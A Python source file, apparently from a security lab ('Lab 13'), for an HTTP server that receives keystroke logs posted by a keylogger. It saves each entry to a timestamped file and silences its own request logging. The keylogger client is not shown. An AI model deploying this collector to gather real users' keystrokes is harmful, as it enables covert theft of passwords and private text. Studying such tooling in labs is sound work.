#!/usr/bin/env python3
"""
Lab 13: API server that receives keystroke logs from the keylogger.
Run with: python3 server.py
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import datetime
import os

LOG_FILE = "received_logs.txt"


class LogHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/logs":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            try:
                data = json.loads(body)
                text = data.get("data", "")
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                entry = f"[{timestamp}] {text}"
                print(entry)
                with open(LOG_FILE, "a") as f:
                    f.write(entry + "\n")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'{"status": "ok"}')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt, *args):
        pass  # Suppress default request logs


if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 9000), LogHandler)
    print(f"Log server running on :9000 — saving to {LOG_FILE}")
    server.serve_forever()
